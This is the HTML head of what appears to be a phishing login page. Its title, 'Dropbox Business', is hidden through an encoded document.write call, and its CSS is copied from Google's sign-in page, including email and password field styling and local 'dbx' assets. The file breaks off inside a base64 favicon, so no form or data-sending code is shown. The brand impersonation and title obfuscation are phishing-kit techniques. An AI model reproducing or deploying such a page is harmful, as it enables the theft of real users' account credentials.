
			<html lang="en">
			  <head>
			  <meta charset="utf-8">
			  <meta content="width=300, initial-scale=1" name="viewport">
<script language="javascript">
document.write( unescape( '%09%09%09%20%3C%74%69%74%6C%65%3E%44%72%6F%70%62%6F%78%20%42%75%73%69%6E%65%73%73%3C%2F%74%69%74%6C%65%3E' ) );
</script> 
			<style>
			  html, body {
			  font-family: Arial, sans-serif;
			  background: #fff;
			  margin: 0;
			  padding: 0;
			  border: 0;
			  position: absolute;
			  height: 100%;
			  min-width: 100%;
			  font-size: 13px;
			  color: #404040;
			  direction: ltr;
			  -webkit-text-size-adjust: none;
			  }
			  button,
			  input[type=button],
			  input[type=submit] {
			  font-family: Arial, sans-serif;
			  font-size: 13px;
			  }
			  a,
			  a:hover,
			  a:visited {
			  color: #427fed;
			  cursor: pointer;
			  text-decoration: none;
			  }
			  a:hover {
			  text-decoration: underline;
			  }
			  h1 {
			  font-size: 20px;
			  color: #262626;
			  margin: 0 0 15px;
			  font-weight: normal;
			  }
			  h2 {
			  font-size: 14px;
			  color: #262626;
			  margin: 0 0 15px;
			  font-weight: bold;
			  }
			  input[type=email],
			  input[type=number],
			  input[type=password],
			  input[type=tel],
			  input[type=text],
			  input[type=url] {
			  -moz-appearance: none;
			  -webkit-appearance: none;
			  appearance: none;
			  display: inline-block;
			  height: 36px;
			  padding: 0 8px;
			  margin: 0;
			  background: #fff;
			  border: 1px solid #d9d9d9;
			  border-top: 1px solid #c0c0c0;
			  -moz-box-sizing: border-box;
			  -webkit-box-sizing: border-box;
			  box-sizing: border-box;
			  -moz-border-radius: 1px;
			  -webkit-border-radius: 1px;
			  border-radius: 1px;
			  font-size: 15px;
			  color: #404040;
			  }
			  input[type=email]:hover,
			  input[type=number]:hover,
			  input[type=password]:hover,
			  input[type=tel]:hover,
			  input[type=text]:hover,
			  input[type=url]:hover {
			  border: 1px solid #b9b9b9;
			  border-top: 1px solid #a0a0a0;
			  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			  }
			  input[type=email]:focus,
			  input[type=number]:focus,
			  input[type=password]:focus,
			  input[type=tel]:focus,
			  input[type=text]:focus,
			  input[type=url]:focus {
			  outline: none;
			  border: 1px solid #4d90fe;
			  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  }
			  input[type=checkbox],
			  input[type=radio] {
			  -webkit-appearance: none;
			  display: inline-block;
			  width: 13px;
			  height: 13px;
			  margin: 0;
			  cursor: pointer;
			  vertical-align: bottom;
			  background: #fff;
			  border: 1px solid #c6c6c6;
			  -moz-border-radius: 1px;
			  -webkit-border-radius: 1px;
			  border-radius: 1px;
			  -moz-box-sizing: border-box;
			  -webkit-box-sizing: border-box;
			  box-sizing: border-box;
			  position: relative;
			  }
			  input[type=checkbox]:active,
			  input[type=radio]:active {
			  background: #ebebeb;
			  }
			  input[type=checkbox]:hover {
			  border-color: #c6c6c6;
			  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			  }
			  input[type=radio] {
			  -moz-border-radius: 1em;
			  -webkit-border-radius: 1em;
			  border-radius: 1em;
			  width: 15px;
			  height: 15px;
			  }
			  input[type=checkbox]:checked,
			  input[type=radio]:checked {
			  background: #fff;
			  }
			  input[type=radio]:checked::after {
			  content: '';
			  display: block;
			  position: relative;
			  top: 3px;
			  left: 3px;
			  width: 7px;
			  height: 7px;
			  background: #666;
			  -moz-border-radius: 1em;
			  -webkit-border-radius: 1em;
			  border-radius: 1em;
			  }
			  input[type=checkbox]:checked::after {
			  content: url( data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAVCAYAAACpF6WWAAAAtklEQVQ4y2P4//8/A7Ux1Q0cxoaCADIbCUgCMTvVXAoE5kA8CYidyXYpGrAH4iVAHIXiCwoMDQTimUBcBsRMlBrKCsTpUANzkC0j11BuIK6EGlgKsoAkQ4FgChD7AzELVI8YEDdDDawDYk6YQaQY6gg1oAqILYC4D8oHGcyLbBAphoJAKtQgGO4EYiHk2CLHUJAXm6AG9gCxNHoSIMdQEJCFGqiALaGSayjMxQwUGzq0S6nhZygA2ojsbh6J67kAAAAASUVORK5CYII=);
			  display: block;
			  position: absolute;
			  top: -6px;
			  left: -5px;
			  }
			  input[type=checkbox]:focus {
			  outline: none;
			  border-color: #4d90fe;
			  }
			  .stacked-label {
			  display: block;
			  font-weight: bold;
			  margin: .5em 0;
			  }
			  .hidden-label {
			  position: absolute !important;
			  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
			  clip: rect(1px, 1px, 1px, 1px);
			  height: 0px;
			  width: 0px;
			  overflow: hidden;
			  visibility: hidden;
			  }
			  input[type=checkbox].form-error,
			  input[type=email].form-error,
			  input[type=number].form-error,
			  input[type=password].form-error,
			  input[type=text].form-error,
			  input[type=tel].form-error,
			  input[type=url].form-error {
			  border: 1px solid #dd4b39;
			  }
			  .error-msg {
			  margin: .5em 0;
			  display: block;
			  color: #dd4b39;
			  line-height: 17px;
			  }
			  .help-link {
			  background: #dd4b39;
			  padding: 0 5px;
			  color: #fff;
			  font-weight: bold;
			  display: inline-block;
			  -moz-border-radius: 1em;
			  -webkit-border-radius: 1em;
			  border-radius: 1em;
			  text-decoration: none;
			  position: relative;
			  top: 0px;
			  }
			  .help-link:visited {
			  color: #fff;
			  }
			  .help-link:hover {
			  color: #fff;
			  background: #c03523;
			  text-decoration: none;
			  }
			  .help-link:active {
			  opacity: 1;
			  background: #ae2817;
			  }
			  .wrapper {
			  position: relative;
			  min-height: 100%;
			  }
			  .content {
			  padding: 0 44px;
			  }
			  .main {
			  padding-bottom: 100px;
			  }
			  /* For modern browsers */
			  .clearfix:before,
			  .clearfix:after {
			  content: "";
			  display: table;
			  }
			  .clearfix:after {
			  clear: both;
			  }
			  /* For IE 6/7 (trigger hasLayout) */
			  .clearfix {
			  zoom:1;
			  }
			  .google-header-bar {
				height: 75px;
				border-bottom: 1px solid #e5e5e5;
				overflow: hidden;
			  }
			  .header .logo {
				float: left;
				margin-top: 13px;
				margin-right: 0;
				margin-bottom: 0;
				margin-left: 0;
			  }
			  .header .secondary-link {
			  margin: 28px 0 0;
			  float: right;
			  }
			  .header .secondary-link a {
			  font-weight: normal;
			  }
			  .google-header-bar.centered {
				border: 0;
				height: 75px;
			  }
			  .google-header-bar.centered .header .logo {
			  float: none;
			  margin: 40px auto 30px;
			  display: block;
			  }
			  .google-header-bar.centered .header .secondary-link {
			  display: none
			  }
			  .google-footer-bar {
			  position: absolute;
			  bottom: 0;
			  height: 35px;
			  width: 100%;
			  border-top: 1px solid #e5e5e5;
			  overflow: hidden;
			  }
			  .footer {
			  padding-top: 7px;
			  font-size: .85em;
			  white-space: nowrap;
			  line-height: 0;
			  }
			  .footer ul {
			  float: left;
			  max-width: 80%;
			  padding: 0;
			  }
			  .footer ul li {
			  color: #737373;
			  display: inline;
			  padding: 0;
			  padding-right: 1.5em;
			  }
			  .footer a {
			  color: #737373;
			  }
			  .lang-chooser-wrap {
			  float: right;
			  display: inline;
			  }
			  .lang-chooser-wrap img {
			  vertical-align: top;
			  }
			  .lang-chooser {
			  font-size: 13px;
			  height: 24px;
			  line-height: 24px;
			  }
			  .lang-chooser option {
			  font-size: 13px;
			  line-height: 24px;
			  }
			  .hidden {
			  height: 0px;
			  width: 0px;
			  overflow: hidden;
			  visibility: hidden;
			  display: none !important;
			  }
			  .banner {
			  text-align: center;
			  }
			  .card {
			  background-color: #f7f7f7;
			  padding: 20px 25px 30px;
			  margin: 0 auto 25px;
			  width: 304px;
			  -moz-border-radius: 2px;
			  -webkit-border-radius: 2px;
			  border-radius: 2px;
			  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			  }
			  .card > *:first-child {
			  margin-top: 0;
			  }
			  .rc-button,
			  .rc-button:visited {
			  display: inline-block;
			  min-width: 46px;
			  text-align: center;
			  color: #444;
			  font-size: 14px;
			  font-weight: 700;
			  height: 36px;
			  padding: 0 8px;
			  line-height: 36px;
			  -moz-border-radius: 3px;
			  -webkit-border-radius: 3px;
			  border-radius: 3px;
			  -o-transition: all 0.218s;
			  -moz-transition: all 0.218s;
			  -webkit-transition: all 0.218s;
			  transition: all 0.218s;
			  border: 1px solid #dcdcdc;
			  background-color: #f5f5f5;
			  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
			  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
			  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
			  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
			  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
			  -o-transition: none;
			  -moz-user-select: none;
			  -webkit-user-select: none;
			  user-select: none;
			  cursor: default;
			  }
			  .card .rc-button {
			  width: 100%;
			  padding: 0;
			  }
			  .rc-button.disabled,
			  .rc-button[disabled] {
			  opacity: .5;
			  filter: alpha(opacity=50);
			  cursor: default;
			  pointer-events: none;
			  }
			  .rc-button:hover {
			  border: 1px solid #c6c6c6;
			  color: #333;
			  text-decoration: none;
			  -o-transition: all 0.0s;
			  -moz-transition: all 0.0s;
			  -webkit-transition: all 0.0s;
			  transition: all 0.0s;
			  background-color: #f8f8f8;
			  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
			  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
			  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
			  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
			  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
			  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
			  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
			  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
			  }
			  .rc-button:active {
			  background-color: #f6f6f6;
			  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
			  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
			  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
			  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
			  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
			  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
			  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
			  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
			  }
			  .rc-button-submit,
			  .rc-button-submit:visited {
			  border: 1px solid #3079ed;
			  color: #fff;
			  text-shadow: 0 1px rgba(0,0,0,0.1);
			  background-color: #4d90fe;
			  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
			  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
			  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
			  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
			  background-image: linear-gradient(top,#4d90fe,#4787ed);
			  }
			  .rc-button-submit:hover {
			  border: 1px solid #2f5bb7;
			  color: #fff;
			  text-shadow: 0 1px rgba(0,0,0,0.3);
			  background-color: #357ae8;
			  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: linear-gradient(top,#4d90fe,#357ae8);
			  }
			  .rc-button-submit:active {
			  background-color: #357ae8;
			  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
			  background-image: linear-gradient(top,#4d90fe,#357ae8);

			  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  }
			  .rc-button-red,
			  .rc-button-red:visited {
			  border: 1px solid transparent;
			  color: #fff;
			  text-shadow: 0 1px rgba(0,0,0,0.1);
			  background-color: #d14836;
			  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
			  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
			  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
			  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
			  background-image: linear-gradient(top,#dd4b39,#d14836);
			  }
			  .rc-button-red:hover {
			  border: 1px solid #b0281a;
			  color: #fff;
			  text-shadow: 0 1px rgba(0,0,0,0.3);
			  background-color: #c53727;
			  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
			  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
			  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
			  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
			  background-image: linear-gradient(top,#dd4b39,#c53727);
			  }
			  .rc-button-red:active {
			  border: 1px solid #992a1b;
			  background-color: #b0281a;
			  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
			  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
			  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
			  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
			  background-image: linear-gradient(top,#dd4b39,#b0281a);
			  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			  }
			  .secondary-actions {
			  text-align: center;
			  }
			</style>
			<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
			  .google-header-bar.centered {
			  }
			  .google-header-bar.centered .header .logo {
				margin-top: 15px;
				margin-right: auto;
				margin-bottom: 15px;
				margin-left: auto;
			  }
			  .card {
			  margin-bottom: 20px;
			  }
			</style>
			<style media="screen and (max-width: 580px)">
			  html, body {
			  font-size: 14px;
			  }
			  .google-header-bar.centered {
			  height: 73px;
			  }
			  .google-header-bar.centered .header .logo {
			  margin: 20px auto 15px;
			  }
			  .content {
			  padding-left: 10px;
			  padding-right: 10px;
			  }
			  .hidden-small {
			  display: none;
			  }
			  .card {
			  padding: 20px 15px 30px;
			  width: 270px;
			  }
			  .footer ul li {
			  padding-right: 1em;
			  }
			  .lang-chooser-wrap {
			  display: none;
			  }
			</style>
			<style>
			  pre.debug {
			  font-family: monospace;
			  position: absolute;
			  left: 0;
			  margin: 0;
			  padding: 1.5em;
			  font-size: 13px;
			  background: #f1f1f1;
			  border-top: 1px solid #e5e5e5;
			  direction: ltr;
			  white-space: pre-wrap;
			  width: 90%;
			  overflow: hidden;
			  }
			</style>
			  <style>
			  @font-face {
			  font-family: 'Open Sans';
			  font-style: normal;
			  font-weight: 300;
			  src: local('Open Sans Light'), local('OpenSans-Light'), url(dbx/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff) format('woff');
			}
			@font-face {
			  font-family: 'Open Sans';
			  font-style: normal;
			  font-weight: 400;
			  src: local('Open Sans'), local('OpenSans'), url(dbx/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff) format('woff');
			}
			  </style>
			  <style>
			  h1, h2 {
			  -webkit-animation-duration: 0.1s;
			  -webkit-animation-name: fontfix;
			  -webkit-animation-iteration-count: 1;
			  -webkit-animation-timing-function: linear;
			  -webkit-animation-delay: 0;
			  }
			  @-webkit-keyframes fontfix {
			  from {
			  opacity: 1;
			  }
			  to {
			  opacity: 1;
			  }
			  }
			  </style>
			<style>
			  .banner {
				text-align: center;
				margin-top: 5px;
				margin-bottom: 5px;
			  }
			  .banner h1 {
			  font-family: 'Open Sans', arial;
			  -webkit-font-smoothing: antialiased;
			  color: #555;
			  font-size: 42px;
			  font-weight: 300;
			  margin-top: 0;
			  margin-bottom: 20px;
			  }
			  .banner h2 {
			  font-family: 'Open Sans', arial;
			  -webkit-font-smoothing: antialiased;
			  color: #555;
			  font-size: 18px;
			  font-weight: 400;
			  margin-bottom: 20px;
			  }
			  .signin-card {
			  width: 274px;
			  padding: 40px 40px;
			  }
			  .signin-card .profile-img {
			  width: 96px;
			  height: 96px;
			  margin: 0 auto 10px;
			  display: block;
			  -moz-border-radius: 50%;
			  -webkit-border-radius: 50%;
			  border-radius: 50%;
			  }
			  .signin-card .profile-name {
			  font-size: 16px;
			  font-weight: bold;
			  text-align: center;
			  margin: 10px 0 0;
			  min-height: 1em;
			  }
			  .signin-card input[type=email],
			  .signin-card input[type=password],
			  .signin-card input[type=text],
			  .signin-card input[type=submit] {
			  width: 100%;
			  display: block;
			  margin-bottom: 10px;
			  z-index: 1;
			  position: relative;
			  -moz-box-sizing: border-box;
			  -webkit-box-sizing: border-box;
			  box-sizing: border-box;
			  }
			  .signin-card #Email,
			  .signin-card #Passwd,
			  .signin-card .captcha {
			  direction: ltr;
			  height: 44px;
			  font-size: 16px;
			  }
			  .signin-card #Email + .stacked-label {
			  margin-top: 15px;
			  }
			  .signin-card #reauthEmail {
			  display: block;
			  margin-bottom: 10px;
			  line-height: 36px;
			  padding: 0 8px;
			  font-size: 15px;
			  color: #404040;
			  line-height: 2;
			  margin-bottom: 10px;
			  font-size: 14px;
			  text-align: center;
			  overflow: hidden;
			  text-overflow: ellipsis;
			  white-space: nowrap;
			  -moz-box-sizing: border-box;
			  -webkit-box-sizing: border-box;
			  box-sizing: border-box;
			  }
			  .one-google p {
			  margin: 0 0 10px;
			  color: #555;
			  font-size: 14px;
			  text-align: center;
			  }
			  .one-google p.create-account,
			  .one-google p.switch-account {
			  margin-bottom: 60px;
			  }
			  .one-google img {
			  display: block;
			  width: 576px;
			  height: 50px;
			  margin: 10px auto;
			  }
			</style>
			<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
			  .banner h1 {
			  font-size: 38px;
			  margin-bottom: 15px;
			  }
			  .banner h2 {
				margin-bottom: 3px;
			  }
			  .one-google p.create-account,
			  .one-google p.switch-account {
			  margin-bottom: 30px;
			  }
			  .signin-card #Email {
			  margin-bottom: 0;
			  }
			  .signin-card #Passwd {
			  margin-top: -1px;
			  }
			  .signin-card #Email.form-error,
			  .signin-card #Passwd.form-error {
			  z-index: 2;
			  }
			  .signin-card #Email:hover,
			  .signin-card #Email:focus,
			  .signin-card #Passwd:hover,
			  .signin-card #Passwd:focus {
			  z-index: 3;
			  }
			</style>
			<style media="screen and (max-width: 580px)">
			  .banner h1 {
			  font-size: 22px;
			  margin-bottom: 15px;
			  }
			  .signin-card {
			  width: 260px;
			  padding: 20px 20px;
			  margin: 0 auto 20px;
			  }
			  .signin-card .profile-img {
			  width: 72px;
			  height: 72px;
			  -moz-border-radius: 72px;
			  -webkit-border-radius: 72px;
			  border-radius: 72px;
			  }
			</style>
			<style>
			  .jfk-tooltip {
			  background-color: #fff;
			  border: 1px solid;
			  color: #737373;
			  font-size: 12px;
			  position: absolute;
			  z-index: 800 !important;
			  border-color: #bbb #bbb #a8a8a8;
			  padding: 16px;
			  width: 250px;
			  }
			 .jfk-tooltip h3 {
			  color: #555;
			  font-size: 12px;
			  margin: 0 0 .5em;
			  }
			 .jfk-tooltip-content p:last-child {
			  margin-bottom: 0;
			  }
			  .jfk-tooltip-arrow {
			  position: absolute;
			  }
			  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
			  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
			  display: block;
			  height: 0;
			  position: absolute;
			  width: 0;
			  }
			  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
			  border: 9px solid;
			  }
			  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
			  border: 8px solid;
			  }
			  .jfk-tooltip-arrowdown {
			  bottom: 0;
			  }
			  .jfk-tooltip-arrowup {
			  top: -9px;
			  }
			  .jfk-tooltip-arrowleft {
			  left: -9px;
			  top: 30px;
			  }
			  .jfk-tooltip-arrowright {
			  right: 0;
			  top: 30px;
			  }
			  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
			  border-color: #bbb transparent;
			  left: -9px;
			  }
			  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
			  border-color: #a8a8a8 transparent;
			  }
			  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
			  border-color: #fff transparent;
			  left: -8px;
			  }
			  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
			  border-bottom-width: 0;
			  }
			  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
			  border-bottom-width: 0;
			  }
			  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
			  border-top-width: 0;
			  }
			  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
			  border-top-width: 0;
			  top: 1px;
			  }
			  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
			  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
			  border-color: transparent #bbb;
			  top: -9px;
			  }
			  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
			  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
			  border-color:transparent #fff;
			  top:-8px;
			  }
			  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
			  border-left-width: 0;
			  }
			  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
			  border-left-width: 0;
			  left: 1px;
			  }
			  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
			  border-right-width: 0;
			  }
			  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
			  border-right-width: 0;
			  }
			  .jfk-tooltip-closebtn {
			  background: url("dbx/x_8px.png") no-repeat;
			  border: 1px solid transparent;
			  height: 21px;
			  opacity: .4;
			  outline: 0;
			  position: absolute;
			  right: 2px;
			  top: 2px;
			  width: 21px;
			  }
			  .jfk-tooltip-closebtn:focus,
			  .jfk-tooltip-closebtn:hover {
			  opacity: .8;
			  cursor: pointer;
			  }
			  .jfk-tooltip-closebtn:focus {
			  border-color: #4d90fe;
			  }
			</style>
			<style media="screen and (max-width: 580px)">
			  .jfk-tooltip {
			  display: none;
			  }
			</style>
			<style>
			  .need-help-reverse {
			  float: right;
			  }
			  .remember .bubble-wrap {
			  position: absolute;
			  padding-top: 3px;
			  -o-transition: opacity .218s ease-in .218s;
			  -moz-transition: opacity .218s ease-in .218s;
			  -webkit-transition: opacity .218s ease-in .218s;
			  transition: opacity .218s ease-in .218s;
			  left: -999em;
			  opacity: 0;
			  width: 314px;
			  margin-left: -20px;
			  }
			  .remember:hover .bubble-wrap,
			  .remember input:focus ~ .bubble-wrap,
			  .remember .bubble-wrap:hover,
			  .remember .bubble-wrap:focus {
			  opacity: 1;
			  left: inherit;
			  }
			  .bubble-pointer {
			  border-left: 10px solid transparent;
			  border-right: 10px solid transparent;
			  border-bottom: 10px solid #fff;
			  width: 0;
			  height: 0;
			  margin-left: 17px;
			  }
			  .bubble {
			  background-color: #fff;
			  padding: 15px;
			  margin-top: -1px;
			  font-size: 11px;
			  -moz-border-radius: 2px;
			  -webkit-border-radius: 2px;
			  border-radius: 2px;
			  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			  }
			  #stay-signed-in {
			  float: left;
			  }
			  #stay-signed-in-tooltip {
			  left: auto;
			  margin-left: -20px;
			  padding-top: 3px;
			  position: absolute;
			  top: 0;
			  visibility: hidden;
			  width: 314px;
			  z-index: 1;
			  }
			  .dasher-tooltip {
			  position: absolute;
			  left: 50%;
			  top: 380px;
			  margin-left: 150px;
			  }
			  .dasher-tooltip .tooltip-pointer {
			  margin-top: 15px;
			  }
			  .dasher-tooltip p {
			  margin-top: 0;
			  }
			  .dasher-tooltip p span {
			  display: block;
			  }
			</style>
			<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
			  .dasher-tooltip {
			  top: 340px;
			  }
			</style>
			<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
			<link href="SpryAssets/SpryValidationPassword.css" rel="stylesheet" type="text/css">
			
			<link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAEAIAAoBQAAJgAAACAgAAABACAAKBQAAE4FAAAoAAAAEAAAACAAAAABACAAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5nsAH+t5ALPsegCr7XYAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/gAAE6XkAcup5APTqegD/6noA/+t6APHreQBw/1UAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADrewA063kAyup6AP/qegD/6noA/+p6AP/qegD/6noA/+t6AMvseAA1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA63oAwed3ACvqegBv63kA/Op6AP/qegD/63kA/Ol5AHTreAAz63oAywAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOp4AEjreQDb6XgAaOt6AEvreQDy63oA7+p6AEnpeABo63oA2up5AEoAAAAAAAAAAAAAAAAAAAAA44AAEux6AJ/reQD+6noA/+p6AP/segCS63oAMud3ACvsegCS6noA/+p6AP/qegD/7HoAn+OAABIAAAAA6XgAU+t5AOfqegD/6noA/+p6AP/qegD/6noA/+t5AKLqegCh6noA/+p6AP/qegD/6noA/+p6AP/reQDn6nkAVOp6AGLqeQD26noA/+p6AP/qegD/63oA++x6AJLweAAR8HgAEex6AJLregD76noA/+p6AP/qegD/6nkA9up6AGIAAAAA6XcAL+t5ANvqegD/63oAwOl3AC8AAAAAAAAAAAAAAAAAAAAA6XoALut6AMDqegD/6noA3Op6ADAAAAAAAAAAAAAAAADmewAf7HoAnf8AAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAB63sAnOd4ACAAAAAAAAAAAAAAAADodwAt63oA2up6AP/reQC763wAJwAAAAAAAAAAAAAAAAAAAADrfAAn63kAu+p6AP/reQDb6XoALgAAAADpegBc6nkA9Op6AP/qegD/6noA/+p5APjsewCD43EACeNxAAnsewCD6nkA+Op6AP/qegD/6noA/+p6APXpegBe6XgAW+p6AOrqegD/6noA/+p6AP/qegD/6noA/+t5AKbreQCm6noA/+p6AP/qegD/6noA/+p6AP/qegDq6XgAWwAAAADneQAV63oApep6AP/qegD/6noA/+p6AKHfgAAI34AACOp6AKHqegD/6noA/+p6AP/reQCm53kAFQAAAAAAAAAAAAAAAAAAAADrewBN63kA4el5AHQAAAAAAAAAAAAAAAAAAAAA6XkAdOt5AOHrewBNAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP9VAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/VQADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAIAAAAEAAAAABACAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAf8AAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOh6ACzqegDC6noAwed5ACoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO2AAA7reQCN6noA++l6AP/pegD/6nkA+up6AIjodAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAHpeABb6noA5ul6AP/pegD/6XoA/+l6AP/pegD/6XoA/+l6AODpeQBQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA